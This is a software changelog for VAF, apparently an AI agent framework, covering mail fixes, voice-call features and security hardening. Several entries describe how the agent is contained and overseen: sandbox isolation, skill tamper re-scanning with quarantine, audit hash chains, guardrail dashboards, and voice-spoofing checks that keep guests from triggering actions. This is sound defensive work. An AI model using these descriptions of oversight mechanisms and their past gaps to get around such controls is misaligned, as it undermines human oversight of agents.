- Mail: a sender rule learned by relabelling a mail now also labels NEW mail from
  that sender. Previously the rule only re-labelled existing mail, so the promise
  that "future mail from this sender gets the same label" did not hold.
- Mail: connecting a Google account now grants everything the mail client needs in
  ONE sign-in. Previously a freshly connected account could not be used by the mail
  client at all and always needed a second, separate "Upgrade to IMAP" step. That
  separate step is gone: an older account that still needs it simply offers
  "Reconnect", the same sign-in as connecting. It preselects the account in
  question (so with several accounts the right one is reconnected), works in the
  standalone mail window, and the panel refreshes by itself once access is granted.
  Microsoft still needs a second sign-in for mail, because Microsoft issues mail and
  calendar access as two separate tokens that cannot be combined.
- Mail: accounts connected with a password or app password no longer show a
  permanent "IMAP not ready" warning - they speak IMAP by definition.
- Mail: opening a label or other non-inbox folder now fetches it on first open.
  Those folders sync on demand by design, but nothing ever requested them, so they
  stayed permanently empty.
- Mail: a message that could not be sent is no longer reported as sent. Such a
  message is held in the outbox and the mail client now shows a warning about it,
  with "Try again" and "Discard" so the warning can actually be cleared once the
  cause is fixed.
- Mail: the message list no longer keeps showing another folder's mail when a
  folder fails to load, and the list now names the folder it belongs to.
- Mail: the unread counts next to the folders update again. They were read once
  when the mail window opened and then never changed, so new mail, reading a
  message and syncing all left them stale.
- Mail: pressing Sync now reports when an account could not be synced, instead of
  spinning briefly and saying nothing.
- Mail: a new Gmail or Microsoft account can be connected straight from the mail
  window's account panel.
- Mail: three kinds of hidden tracker in HTML mail are now caught and reported.
  A CSS-escaped `url(`, `image-set(...)` and `src(...)` inside an inline style
  slipped past the filter with the third-party address intact, and the mail was
  shown as if nothing had been blocked. The browser's own rules stopped the actual
  request, so no address was ever contacted, but the warning was missing. Blocked
  styles are now counted, so the "external content blocked" notice is honest.
- Mail: image loading now uses the network proxy configured for the machine
  (`https_proxy`/`http_proxy`, honouring `no_proxy`). In managed networks that
  forbid direct internet access, loading images previously just failed, and the
  organisation could not see or filter what the mail view fetched.
- Testing or verifying a mail account no longer freezes the whole backend. The
  IMAP credential test/verify and OAuth token-exchange endpoints ran blocking
  network IO directly on the uvicorn event loop, so every other API request hung
  until the provider round-trip finished. All provider IO in the email routes now
  runs in worker threads.
- The Logs window no longer crashes with a blank "This page couldn't load"
  after a rebuild. A calendar-follow effect had been placed after the modal's
  early return, so the number of React hooks changed when the window opened
  (React error #310); the effect is back above the guard.
- A timed-out or stopped sandbox execution is now actually terminated inside
  the container. Slim sandbox images ship no pkill, so the old kill path
  silently did nothing: a timed-out package install kept running blind,
  finished after the workspace cleanup and left a 229MB orphan directory
  behind. The kill is also scoped to the single run's process tree, so it can
  never take down another user's concurrent sandbox execution in the shared
  container.
- The Logs window now follows the calendar: after midnight the audit chain,
  hero and activity panels advance to the new day as soon as it has events,
  instead of silently continuing to show yesterday (fresh tool runs appeared
  to be missing from the audit chain). Date handling also switched from UTC
  to local time, which had marked the previous day as "Today" until 02:00
  CEST - the same fix applies to the sidebar chain-alert probe. Explicitly
  picking an older day in the date selector still pins it.
- Running the test suite on a development machine no longer writes fake
  "Message sent via Discord" entries into the live Activity feed and channel
  history. A unit test executed the real send tool with only the network call
  mocked, so its bookkeeping side effects (activity notification, channel
  store row, outbound session stub for a placeholder recipient) landed in the
  real stores on every run - hundreds of entries had accumulated and looked
  like a compromise at first glance. No message ever left the machine; the
  test now isolates all side-effect stores and the debris has been removed.

### Security
- Whether an account counts as an administrator is now decided the same way everywhere.
  The check that lets administrators use restricted tools compared the stored role
  letter for letter, while the check that decides which files may be opened accepts the
  role regardless of capitalisation. An account whose role was stored as "Admin" would
  therefore have been given administrator access to files while still being refused
  restricted tools. Accounts created or edited in VAF always store the role in lower
  case, so this could not be triggered through the app; the two checks now share one
  rule regardless.
- Mail: a request carrying a user name but no user scope could be served from the
  local administrator's mailbox by the new mail engine (read and write). Such
  callers now stay on their own mail store, matching the isolation rule the other
  two layers already enforced.
- Outgoing email attachments now resolve their file paths under the same
  per-user filesystem jail that already protects librarian and file-write
  operations: in network mode a non-admin user's agent can no longer attach
  files outside that user's own data (previously only the static block list
  applied). The jail computation is now a single shared helper used by all
  three tools, with a regression test.
- The agent-side phishing-filter settings
  (`email_agent_phishing_filter_enabled`, `email_agent_phishing_score_threshold`,
  `email_agent_trusted_sender_domains`) and the IMAP/SMTP SSRF opt-out
  (`email_allow_private_hosts`) are now registered config keys and
  admin-write-only. Previously they were read with inline defaults and, in the
  SSRF case, any LAN user could have toggled the guard for the whole instance.
- Mail transport logs now mask account ids consistently (first 3 characters)
  and truncate provider error-response bodies; several error paths used to
  write the full account address and full API response into the always-on
  domain log.
- Dependency updates closing all 13 open Dependabot alerts: Next.js 16.2.9 to
  16.2.11 (nine advisories, incl. SSRF in Server Actions and in rewrites,
  middleware bypass with Turbopack, Server Action DoS and cache confusion),
  sharp 0.34.5 to 0.35.3 (inherited libvips CVEs, now forced via an override
  because Next.js still pins the vulnerable minor), brace-expansion 1.1.14 to
  1.1.16 (exponential-time expansion DoS, dev-only), DOMPurify 3.4.11 to
  3.4.12 (`CUSTOM_ELEMENT_HANDLING` bypass) and protobufjs 7.6.4 to 7.6.5 in
  the WhatsApp bridge (infinite loop in `.proto` option parsing).
- postcss is now forced to at least 8.5.12 via an override (arbitrary file
  read through attacker-controlled `sourceMappingURL`): Next.js exact-pins a
  vulnerable 8.4.31 copy, which the override dedupes away to a single
  patched node. Build-time tooling only, no runtime exposure.
- The session token that rides in the WebSocket handshake URL
  (`/ws?token=<jwt>`, unavoidable because WebSockets cannot send an
  Authorization header) is now masked to `token=***` in the server access log
  instead of being printed in full. A live, short-lived admin token could
  otherwise be replayed by anyone who read the terminal or the tray log. The
  same mask also covers `access_token` / `api_key` / `password` if they ever
  appear in a logged URL.

## [0.1.0a18] - 2026-07-23

### Security
- The ephemeral sandbox fallback (used when the persistent vaf-sandbox
  container is unavailable) now carries the same hardening as the persistent
  one: all Linux capabilities dropped, no-new-privileges, and its own isolated
  bridge network instead of Docker's default bridge - previously two
  concurrent ephemeral sandboxes (for example of two different users) could
  reach each other over the shared default bridge.
- Sandbox pip installs are now temporary and per-run: packages requested via
  the tool's packages parameter (and even in-code pip installs, redirected via
  PIP_TARGET) land in the run's private directory and are deleted with it, so
  nothing accumulates in the shared sandbox container across runs or users;
  package specs are validated before reaching the shell and the shared pip
  cache no longer grows.

### Fixed
- **The desktop window no longer navigation-loops between the dashboard and the
  login page.** With an expired auth cookie but a still-valid token in browser
  storage, the server-side route gate and the login page's "already logged in"
  check disagreed forever: the gate redirected to /login, the login page bounced
  back, and the window reloaded in a tight loop until the browser engine
  throttled navigation and the UI froze. The login page's bounce decision now
  uses the same authority as the server gate (the cookie only), stale
  browser-storage tokens are cleaned up, and a circuit breaker stops any future
  redirect ping-pong after two bounces instead of trapping the user. The root
  desync is also removed on the backend: the auth cookie's lifetime is now
  always derived from the token's own expiry instead of hardcoded 30-day
  values, so a cookie can never outlive the session it carries.
- **The Linux desktop window no longer stays dead after a GPU-driver crash.** Two
  incidents aborted the whole tray process from inside the host-side GPU
  compositing path (once inside the NVIDIA GL library while resizing the window),
  which the existing renderer-only crash recovery cannot catch. VAF now disables
  the NVIDIA driver's threaded optimizations for the tray process on NVIDIA hosts
  (GPU acceleration and vsync unaffected; export `__GL_THREADED_OPTIMIZATIONS`
  yourself to opt out), and the Linux shell launchers run the windowed tray under
  a bounded restart supervisor: an abnormal exit restarts the app within seconds
  (at most 3 times per 10 minutes), while a normal quit or Ctrl+C never does.

- **Chat no longer shows phantom date separators around invisible rows.** Live
  system-step notes are spliced into the message list with the current time;
  when one landed inside an older conversation, the day-separator logic compared
  against the invisible row and painted misordered "day ended / continued"
  pairs (e.g. July 21 / July 22 / July 22 / July 21) between two messages from
  the same day. Separators now only compare messages that actually render.

### Added
- **Installed skills are re-scanned periodically (post-install tamper
  detection).** The security scanner already checks every skill at create,
  update, upload and editor-save time (verified end-to-end against synthetic
  malicious skills); what it could not catch was a skill whose files change on
  disk AFTER installation. A background worker now re-scans all installed
  skills every `skills_rescan_interval_hours` (default 5, `0` disables),
  updates their persisted scan results, and raises a security event when a
  skill's risk level worsened. Blocked installs and admin overrides are
  recorded as security events too, so the Overview's skills panel shows real
  numbers: skills by risk level as a live donut, threats blocked today, admin
  overrides, re-scan alerts, the riskiest skills, and the time of the last
  full scan - an installed high-risk skill turns the protection banner red,
  a medium-risk one amber. A skill that re-scans as high-risk after install is
  automatically QUARANTINED: it disappears from every agent path (skill list,
  the read/list tools, the system prompt) until an admin resolves it on the
  dashboard - either delete it, or, if it is a false positive, restore it,
  which requires re-entering the admin's 2FA code so a stolen session alone
  cannot re-expose it to the agent. The protection banner now names the actual
  worst cause (e.g. "High-risk skill installed", "Channel in permissive mode")
  instead of always attributing a red state to the audit chain. Clicking a skill
  in the panel opens a detail view that re-scans it live and shows exactly WHY
  it was flagged (the matched rules with category, message and snippet) next to
  the resolution actions. A medium-risk skill can be acknowledged (2FA): it
  stays visible and still shown as medium, but the banner returns to green -
  the admin has reviewed and accepted it. When security events were recorded
  today (blocked access, rejected senders, skill blocks), the Log Files section
  shows a pulsing count that nudges the admin to open the security log, and the
  Logs button in the main sidebar shows an unread notification dot for new
  security events, so a blocked login or a quarantined skill is noticed without
  the window being open. Both the sidebar dot and the in-window log badge are
  unread-based against a shared marker: they clear once the admin opens the
  security log and re-light only on a newer event, rather than sticking as a
  permanent count.
- Logs Overview: the last three panels are now live. "Background agent" shows
  the proactive agent per user across all scopes (active run, the question it
  is waiting on with channel and nudge state, time since the last run with the
  tools it used, and the recent asked/replied/done/declined question history) -
  an admin oversight view served by a new admin-gated `GET /api/thinking/status`.
  "Recent supervised activity" lists the newest hash-chained tool actions of
  the selected day with per-user attribution, derived from already-loaded audit
  data. "Active supervised units" shows the live sub-agent watchdog (agent
  type, owner, runtime, heartbeat) with a stuck marker for stale units.
- Security: the supervisor watchdog endpoints are now caller-scoped. Previously
  any authenticated user could list ALL running sub-agent units (including
  other users' task text) and kill them by task id; now non-admins only see and
  cancel units of their own sessions, while the admin keeps the full attributed
  watchdog view.
- Fixed a test-isolation gap where a test suite wrote synthetic scope
  directories into the real thinking-requests store; the debris surfaced as
  phantom users in the new Background-agent panel and has been cleaned up.
- **Security event log: blocked access attempts are now recorded and visible.**
  Rejected connection attempts (non-LAN IPs, requests without or with invalid
  authentication, rejected WebSocket handshakes), failed login/2FA attempts,
  and unauthorized messenger senders (Telegram/WhatsApp/Discord messages
  dropped by the pairing gate, recorded with channel, sender id and time)
  are written to a new `security` log (visible in the Logs window's file rail)
  and to a structured store behind an admin-only API. Never logs passwords,
  codes, or tokens; a flood throttle keeps hammering attackers from growing the
  log unboundedly. In the Overview dashboard every protection module is now
  clickable: a detail popup shows the module's live data - for the firewall
  module the deflected attempts of the day (with counts for blocked requests
  and failed logins), the live-inspected Docker network isolation - every VAF
  container with its network and published ports, shown independent of LAN
  mode; a port bound beyond loopback (LAN-exposed) flips the module and the
  banner to the warning state - plus a button that jumps straight into the
  security log's history; for the code sandbox the live-inspected container hardening; for the
  audit chain the verification facts; for user isolation the enforcement mode
  (fail-closed in server mode), memory-DB reachability, and admin-level
  operational metrics: a live-measured RAG search latency (real pgvector
  distance query), the isolated per-user memory stores by username with their
  entry counts, the total memory-DB size, and the per-user folder totals (how
  many isolated folders each user owns and their summed disk usage, with
  legacy folders in an explicit unassigned bucket) - an unreachable memory
  database now shows as an amber warning on the dashboard instead of failing
  silently. The channel-perimeter module answers "is someone unauthorized
  talking to my bot?": per messenger it shows enabled state, ingress mode,
  paired-sender count, last activity and today's rejected count, with the
  rejected senders listed in the detail popup - and an enabled channel running
  in permissive mode turns the module and the banner amber. The audit-chain
  popup additionally breaks the day's secured events down per user, making
  visible that all users share one tamper-evident chain the admin verifies.
  The phishing-shield module shows how many synced messages are flagged and,
  per flagged mail, WHY: the matched heuristics (provider spam category,
  punycode sender domain, urgency/social-engineering language, executive
  impersonation via free-mail, phishing wording patterns) as readable chips
  with the score, plus a note that flagged mail is hidden from the agent's
  tools but never deleted. The guardrails module shows what actually governs
  the agent: the gate switches (plan gate, confirmation gate, incident gates,
  channel tool restrictions - with a visible warning when loosened), the live
  tool inventory grouped by permission level (read/write/dangerous/system,
  admin-only, channel-blocked), and - previously invisible anywhere - the
  standing permissions from the trust store: which tools carry a permanent
  "always allow" and which directories are trusted. With that, every
  protection module of the overview is wired to live data.
- **Logs window: new "Overview" tab (protection dashboard).** The Logs window now
  opens on an antivirus-style overview summarizing VAF's protection mechanisms:
  an overall protection-status banner, eight protection-module cards (audit
  hash-chain integrity, code sandbox, LAN firewall, user isolation, held actions,
  channel perimeter, phishing shield, guardrails/tool policy), an audit-chain
  panel, a skills-scanned/threats-blocked panel, a background-agent panel, and
  security-posture sections. The audit-integrity card, the audit-chain panel,
  and the overall status banner are wired live: chain verification verdict,
  events-secured count, the newest chain links (updating every 5 seconds while
  the tab is open), the last secured event, and a per-day selector. The status
  banner is a worst-of roll-up with four states (green "no anomalies", amber
  "attention", red "critical", grey "not measured") shown as a large shield
  motif filling the panel: it turns red the moment chain verification fails,
  amber on warning-level module states, and absent data renders as "not
  measured" instead of a false green. The code-sandbox module is wired live via
  a new admin-only status endpoint that inspects the real container: green
  while execution is container-enforced (running or on-demand), amber when the
  Docker daemon is unavailable (execution stays blocked, fail-closed) - the
  first warning input that can actually turn the banner amber. All remaining
  modules render an explicit
  "No data available" state; their bindings follow step by step.

## [0.1.0a17] - 2026-07-22

### Added
- **VAF is published to PyPI with every release.** Library users can install the
  framework with `pip install --pre vaf` (`--pre` is the recommended spelling while
  VAF is in alpha) and update it with `pip install -U --pre vaf`; the desktop/server installers
  keep working exactly as before. Publishing is tokenless (PyPI Trusted Publishing),
  and releases can be rehearsed against TestPyPI via a manual workflow first. The
  embedding guide gained a "Choosing a backend: local vs API" section, and the README
  now opens with a library quickstart.

### Changed
- **`vaf update` refuses to run outside a VAF source checkout.** On a pip-installed
  VAF (or a folder that is not a VAF source tree) the git self-updater now points to
  `pip install -U --pre vaf` instead of offering a git conversion that could have
  damaged the Python environment.
- **VAF's packaging moved to the modern Python standard (`pyproject.toml`).** The
  install commands do not change (`pip install -e .`, extras like `vaf[server]` and
  `vaf[all]` stay exactly the same), the license is now declared in the standard
  machine-readable form, and the `LICENSING.md` terms file ships inside the package.
- **Installing VAF with pip no longer runs platform setup scripts.** A plain
  `pip install -e .` used to silently trigger macOS/Windows provisioning scripts in
  some legacy flows; a pip install is now strictly a Python-package install. The
  desktop installers (`install.sh` / `install.ps1`) are unaffected and keep doing the
  full provisioning.
- **The `vaf` command now works on a minimal library install.** With only the base
  dependencies installed, `vaf --version`, `vaf prompt` and other light commands run
  normally, and commands that need optional components (for example `vaf run --web`
  or the Discord bridge) explain which extra to install (such as
  `pip install "vaf[server]"`) instead of crashing with an import error.

### Fixed
- **The document editor's page stays white in dark mode.** The DOCX editor's sheet is a
  rendering of real paper, and Print and PDF show exactly what is on screen, so it keeps its
  light appearance while the app around it goes dark.
- **A tool the local model tried to run no longer silently vanishes.** With the built-in
  local model, some tool calls (for example adding a calendar event) came out in a format the
  app recognised only for one specific model family. For every other local model the call was
  left as plain text in the chat and simply never ran, so nothing happened and no error was
  shown. That format is now recognised for any local model.
- **The app no longer runs its window on native Wayland, which could crash it on Linux.**
  VAF has always meant to run its window through XWayland (native Wayland conflicts with the
  browser engine and, with the GPU shared in-process, could freeze and then kill the app).
  That safeguard silently never applied on KDE and GNOME Wayland desktops, because those
  sessions set the display server themselves and VAF only filled in a value when none was
  set. It now sets it deliberately. If your system has no XWayland, VAF leaves your session
  alone instead of starting with no display at all, and `VAF_ALLOW_WAYLAND=1` keeps native
  Wayland if it works well for you. The choice is written to the startup log.
- **A slow or unreachable speech provider can no longer freeze the whole app.** The
  ElevenLabs voice/model catalog was fetched in a way that blocked the server's event loop,
  so opening Voice settings with a slow, unreachable or exhausted account could stall every
  request and the live connection for everyone until it timed out. It is now fetched without
  blocking, a failure is remembered briefly instead of being retried on every redraw, and two
  simultaneous requests share one lookup. The same blocking pattern was fixed in the email
  account verification and the Telegram dashboard.
- **The local model is no longer unloaded while it is still working.** When a longer task was
  running and you had not typed for a while, the app counted you as away and freed the model
  mid-task. The work then stalled behind failing retries and looked like a freeze, and two
  competing attempts to load the model again could collide. The app now keeps the model
  loaded whenever something is actually running, whether that is your message, a background
  helper or a live call. Loading is also serialized, so two parts of the app can no longer
  fight over it, a model that is merely still loading is waited for instead of killed, and
  stopped model processes are cleaned up instead of lingering.
- **A finished workflow is no longer labelled FAILED when it succeeded.** Workflows that run
  in their own process reported their outcome to the app, but the outcome itself was dropped
  on the way to the browser, so the panel fell back to showing a failure. Every step showed a
  green tick, the document was written, the chat said it worked, and the panel still said
  FAILED. The result now arrives intact, and so does the live output those runs stream.
- **The workflow panel no longer gets stuck showing a run that has long finished.** If the
  connection to the browser dropped while a workflow was running, everything that happened
  afterwards was lost, and the panel kept showing the last thing it had seen, with no way to
  close it. It now asks the app what the real state is when the connection returns, when you
  come back to the tab, and after a reload. If the run is over, the panel says so plainly and
  closes instead of inventing a result. It also has a close button now, which matters on
  phones where the panel covers the whole screen.
- **Terminal windows opened for background work now close again on Linux.** A window opened
  for a sub-agent or a workflow announced that it was closing and then stayed on a shell
  prompt forever, because a shell was started on top of the finished task. Windows now close
  when the work succeeded and stay open when it did not, so an error can still be read, and
  `--no-auto-close` keeps working as documented. On macOS this also depends on your Terminal
  profile setting for what happens when the shell exits.
- **No stray terminal window when the browser connection drops.** Work started from the app
  ran without a visible window only while a browser was connected. If the connection dropped
  during a long run, the next helper opened a terminal window on the desktop, and the app's
  Stop button could not reach it. The decision no longer depends on a browser being attached
  at that moment.
- **A busy workflow no longer floods and kills its own connection to the browser.** While a
  research step was running, its progress animation was forwarded to the browser frame by
  frame, hundreds of times per second. That was enough to drop the live connection in the
  middle of a run, after which the Workflow Runtime panel never advanced again and sat at
  the last state it had received. Progress output is now filtered and rate-limited before it
  is sent, in every place that forwards it, and the animation that produced it is no longer
  started when nobody is watching a real terminal. The separate workflow terminal keeps its
  colours and live display. Long, quiet steps are also no longer mistaken for stuck ones:
  the "no output" watchdog now allows a heavy step the time it is actually given.
- **A workflow that hands work to a background helper is no longer reported as crashed.**
  When a workflow step passes its work to a helper (writing a document, researching a
  topic), the workflow pauses and waits instead of finishing. Three of the places that read
  the result knew only "done" and "broken", so a perfectly healthy run was announced as
  failed while the work was still being produced, and the assistant apologized for a crash
  that never happened. A paused run is now recognized everywhere as still running, in chat,
  in the separate workflow terminal and in automation reports. Paused runs also remember
  which conversation they belong to, so switching conversations no longer discards them, and
  a run whose helper was the final step is now completed automatically in the app instead of
  only in the terminal client.
- **Telegram stays responsive while a voice message or file is transferred.** Sending or
  receiving audio, voice notes and documents held up the Telegram connection for as long as
  the transfer took, so other messages in the same chat had to wait behind it. Transfers now
  run out of the way of the message loop.

## [0.1.0a16] - 2026-07-19

### Added
- **The agent recovers when a call misreads your voice, instead of ignoring you.** In a
  room with other people, the voice check can briefly lose track of who is the owner (a
  guest speaking resets the in-call "this is the owner" bridge), and your own short command
  could be treated as a stranger's and silently dropped. Now, when a voice it cannot place
  is clearly talking TO the agent, it asks "did you mean me?" in the language being spoken;
  if your reply confirms your voice, it picks straight back up (and carries out what you
  asked). It never just goes quiet on your answer: if you say yes but it still cannot place
  your voice, it says so and asks you to confirm on screen or via your messenger so it can
  learn your voice and misread you less often. It never acts on an unconfirmed voice,
  and your voice profile is only ever updated from a confirmation you make yourself. The
  agent also no longer goes silent on a turn that was clearly addressed to it, and you can
  arm "talk to the other person" with a plain spoken command even when the local model is
  being unreliable.
- **In a voice call you can now ask the agent to talk to the other person with you.** By
  default the agent overhears the people around you and stays quiet, which is right when
  you are just talking to someone else. When you actually want it to take part - "answer
  her", "talk to my mother, she is asking you something" - it now does: it starts replying
  to the guest directly IN THEIR OWN LANGUAGE (even if your call started in another), and
  greets them. While it is talking with the guest it now follows the actual back-and-forth
  in the room - it is given the shared, spoken-aloud conversation (everyone's turns, in
  order, in whatever languages are spoken) so it can hold a real multi-person conversation
  instead of replying to each line in isolation; the guest still never sees your private
  information, only what was said out loud after you brought them in. It stays in that mode
  until you tell it you are done ("thanks, that's all"), the conversation goes quiet for a
  while, or the call ends.
- **The voice agent no longer refuses to speak a language it actually knows.** On a call it
  now replies in the language it is being spoken to, or the language you ask it to use,
  instead of being pinned to one language by its instructions - so asking it to talk to
  someone in another language works, rather than getting "I'm not fluent in that." Throughout, the guest can only be spoken to - the agent never shares your
  private information and never runs an action on a guest's request. On a call with more
  than one person the agent is also given the situation (who is present and the language
  being spoken) so it responds more naturally.
- **In a voice call, the agent now understands your answer to its own question.** When it
  asks you something, your next reply is treated as the answer even if it is brief ("yes",
  "at three"), instead of a stray remark; if you ask it to repeat, it re-asks the same
  question in your language. It is aware of the room: one-on-one it takes your reply
  directly; with other people around, a brief reply still counts, but a longer one is only
  treated as your answer when it is on-topic, so it does not mistake side-talk for an
  answer. Someone else can get a brief spoken reply when they say something clearly
  on-topic, but their words are never taken as your answer and can never trigger an action.

### Changed
- **Choosing the live-call voice model is now a dropdown, not a text field.** For a
  dedicated local model you pick from your already-downloaded models (the recommended
  Gemma 4 E4B is always offered and is fetched automatically when you select it); for an
  API provider you pick from that provider's models, with a refresh button to pull the
  live list, instead of typing a name by hand. Downloading local models stays in the AI &
  Model settings, and a value saved by an earlier version keeps working.
- **The agent stops asking "was that you?" on every unrecognized voice.** The speaker
  confirmation now fires in two more targeted cases: promptly when a voice it does not
  recognize CLAIMS to be you ("I'm NAME") - a spoofing check that asks you to confirm -
  and, far more rarely, on a borderline recording of your OWN voice (for the adaptive
  re-recognition). A stranger simply talking near the mic no longer triggers the
  question. The claim detection is multilingual.

### Fixed
- **The voice agent no longer speaks a stray fragment of its own reasoning.** Two cases are
  now covered: a model's thinking wrapped in a tag is always removed before anything is
  spoken - not only `<think>` but the variants other models use (`<thinking>`,
  `<reasoning>`, `<scratchpad>`, and more), whether the tag is closed or the stream was cut
  off mid-thought; and when a weak model leaks its thinking as PLAIN text (no tag) starting
  with a connective like "But we need to check: the user might be...", the filter now looks
  past a leading "but/so/and/well/okay" and drops the fragment to a short "say that again"
  instead of reading it aloud.
- **The voice agent recognizes you from the first words of a call.** The voice-recognition
  model is now warmed up the moment a call opens, instead of loading lazily on the first
  thing you say. During that cold load you were briefly treated as an unknown speaker -
  formal replies, a needless "did you mean me?", and it staying quiet on side-talk - until
  the model finished loading; now you are placed correctly from the start.
- **The agent no longer reads its own thinking out loud in a voice call.** When the local
  model announcing a delegated result leaked its internal reasoning into the text (for
  example while it was stuck), the voice could read that `<think>` reasoning aloud. It is
  now stripped before anything is spoken or stored, so you only ever hear the actual answer.
- **A voice-call reply in another language is now spoken by that language's voice.** When the
  agent answers in a different language than you spoke (e.g. Turkish in a German conversation),
  it uses a matching voice for that language instead of speaking it with your usual voice -
  whenever a voice for that language is available (a downloaded local voice, or any cloud voice
  provider). Otherwise it stays on your call voice.
- **Your spoken language is no longer mis-detected at the start of a voice call.** The call
  now tells the speech-to-text service the language from your profile up front, so a short
  first sentence in German is not transcribed as French (or another language) - which had
  the agent constantly asking you to repeat. It still notices if you genuinely switch
  languages mid-call.
- **The agent stops mistaking you for a stranger mid-call on short replies.** In a voice
  call, once it has clearly recognized your voice, a brief or noisy follow-up ("ja", "at
  three") no longer flips you to an unknown speaker and locks you out of acting - your
  recognition stays "sticky" for a while after it verifies you. A clearly different voice
  still switches immediately, so it does not weaken the guard against someone else acting
  as you.
- **The local voice model now starts on Apple Silicon Macs.** The recommended local
  German voice model (Gemma) could fail to start on macOS/Metal with only "Server failed
  to start" and an empty log. A fallback for the quantized cache existed but never fired:
  the non-debug log level wrote an empty log, hiding the very error the retry looked for.
  The fallback now runs whenever the first start attempt dies and an alternative exists,
  non-debug logging captures fatal errors again, and the retry scans the full log. So an
  empty or low-verbosity log can no longer silently disable it.
- **The one-time "what's new" alpha notice no longer reappears on every Settings close.**
  Closing Settings refreshed your time format and name, but also reset the seen-version
  gate, which re-showed the one-time notice each time you left Settings. It now refreshes
  those without touching the gate. (A deeper per-user workspace persistence quirk can
  still surface it once per app start; that root cause is tracked separately.)

## [0.1.0a15] - 2026-07-18

### Added
- **Voice call, the reflex features speak your language**: the agent's "did you mean me?"
  clarification and the cue words behind it now ship in about 35 languages (generated
  from English, so unlisted languages fall back to English), and it detects being spoken
  to across the major languages, not just German and English. What it hears (speech
  recognition) and what it says (the spoken reply) were already multilingual; this widens
  the small fixed phrases in between. The proactive chime-in was also tuned so it actually
  speaks up on genuinely on-topic overheard talk instead of staying silent.
- **Voice call, you can interrupt the agent**: while the agent is speaking you can now
  just start talking and it stops and listens instead of making you wait for it to
  finish. The microphone is opened with echo cancellation so it
  does not hear its own voice, and it only yields to a real, sustained interruption (a
  brief noise will not cut it off). For now this covers interrupting while it is
  speaking, on a web call; interrupting while it is still thinking, and having it resume
  where it left off, are planned next.
- **Voice call, the agent chimes in on interesting talk**: during a live call the agent
  now keeps a short rolling transcript of what it hears, and when someone else in the
  room says something that matches your configured interest topics, it can briefly and
  naturally chime in with a grounded remark instead of staying silent. It never invents
  a reason to speak (a chime-in must be grounded in your topics, and the agent may still stay
  silent), never chimes in while it is busy with a task, and does not repeat itself. One
  simple dial, `voice_awareness_activity` (quiet..active), sets how readily it joins in
  (at the lowest setting it only listens); it behaves calmly on its own when you are in a
  conversation with someone else and more readily one-to-one, without you managing any
  modes. It also asks "did you mean me?" when an unclear speaker says something like "can
  you hear me?" and it cannot tell whether it was addressed. Tool actions stay yours
  alone (a guest still cannot make it do anything), and your private context is never
  used to chime in for a guest.
- **Per-speaker language hint for cloud STT**: the shared speech client now caches
  the language the cloud provider already returns and passes it as a hint on the
  next transcription (a more precise, cheaper call), instead of running a local
  model to pre-detect it. The cache is keyed per speaker (the web mic uses the
  user's scope, so it stays user-isolated), and to catch a mid-conversation
  language switch it re-detects hint-free every few turns and always refreshes from
  the actually-detected language. No new dependency and no pre-call overhead. The
  hint is language-agnostic (normalized to ISO-639-1, ISO-639-3 mapped, locales
  reduced to base) so it works across every supported language, and the Veyllo lane
  auto-detects with `multi` (automatic code-switching) when no language is pinned.
- **Veyllo speech-to-text**: Veyllo is now selectable as a cloud STT provider
  (`speech_stt_provider = veyllo`, model `veyllo-transcribe`), using the same
  API key and base URL as the Veyllo chat/vision provider. The first time a Veyllo
  key is added (at onboarding or later in Settings) while no STT provider was
  chosen, Veyllo becomes the default STT lane, and it always falls back to the
  local engine on any failure (no internet, empty credits, timeout); an explicit
  later choice (local, OpenAI, ElevenLabs) overrides it. The `veyllo-transcribe`
  audio model is filtered out of the chat-model dropdowns.
- **Data Explorer legibility**: deleting a chat now saves the chat's title
  into the surviving workspace folder, so folders left behind by deleted
  chats keep their human name instead of showing a raw internal folder name
  (an explicit rename always wins; folders orphaned before this change keep
  their old names). The badge on such folders now reads "chat deleted"
  instead of the jargon "orphan", the list sorts live chats first and
  deleted-chat folders to the end, and a new info button in the header
  explains the folder colors, the badge, and the current-chat dot. The
  window now keeps a fixed height with a refined scrollbar instead of
  growing and shrinking with the workspace count, and each tile counts
  its folders too (a workspace holding only a subfolder no longer reads
  "0 files" as if it were empty).
- **Data Explorer search**: a search field in the "My Workspaces" header
  filters workspaces by name instantly and also searches file names and
  text-file contents inside them (server-side, scoped to the user's own
  workspaces, bounded per workspace); matching files are shown under each
  workspace tile with a content snippet in the tooltip.
- **Three new developer docs make the existing machinery usable from
  outside**, each verified against the code: an observability guide
  (structured tool/gate events via the engine's event sink, plus the
  machine-readable NDJSON mode of the scripting CLI for integrating VAF as a
  subprocess from any language), a debugging guide (the complete map of log
  files, how to redirect them, what the debug switch does and does not
  silence, how to read a session file), and an engine reference (the
  constructor, lifecycle, turn and tool-dispatch contracts, and concurrency
  rules of the advanced embedding class). The embedding guide gains a
  security-posture section (what needs Docker, what runs on the host, what
  ports are and are not opened), pointers to the other extension points
  (workflows, skills, MCP servers, the update-surviving custom-tools folder),
  and an honest note on custom OpenAI-compatible endpoints. Key engine
  methods now carry docstrings.

- **Persistent conversations, richer events, async and marker constants on
  the library facade.** Four additions for developers embedding VAF:
  `agent.save_session()` plus `Agent(session=<id>)` persist and resume a
  conversation across process restarts (idempotent updates, loud failure on
  unknown ids, tenant-ownership check under `user_scope`; runnable chatbot
  example included); `vaf.markers` exports the special return-value strings
  (`SYSTEM_LOG_ONLY`, `GENERATION_STOPPED`, ...) as constants with a CI
  guard pinning them against the engine source; the structured event sink
  grows `duration_ms` and a dispatch-level `ok` flag on `tool_end` plus new
  `llm_start`/`llm_end` events with token usage on API providers (attached
  across backend swaps; facade shortcut `agent.on_event(cb)`); and
  `await agent.run_async(...)` runs a turn in a worker thread for
  event-loop applications - documented honestly as a thread-executor
  wrapper, not native async.
- **Multi-tenant embedding: `Agent(user_scope=...)`.** An application
  embedding VAF can now assert which end user a conversation belongs to
  with one parameter. The value is validated as a UUID at construction
  (a bad scope fails loudly instead of silently operating on the machine
  owner's data), the account username is resolved together with the scope
  (never the admin fallback), the identity is bound before the system
  prompt is built and re-asserted on every turn, and memory/reminders/
  per-user files then key on that scope with the product's fail-closed
  filters. The embedding guide gains a "Multi-tenant embedding" section
  spelling out the trust model and the hard limits (one tenant per
  process, the machine-global trust store, shared on-disk config, no
  reliance on database-level isolation yet), and now states honestly that
  a bare unscoped agent acts as the machine owner in local mode. Also
  fixed: the sandbox tool now receives the user scope from the dispatcher
  (spoof-proof direct assignment), so its per-user container work
  directories key on the calling user (previously every main-agent run
  shared one prefix).

- **One provider registry instead of eleven copies.** The LLM provider set
  and its endpoints now live in a single source of truth
  (`vaf/core/provider_registry.py`); the backend factory, the coder's
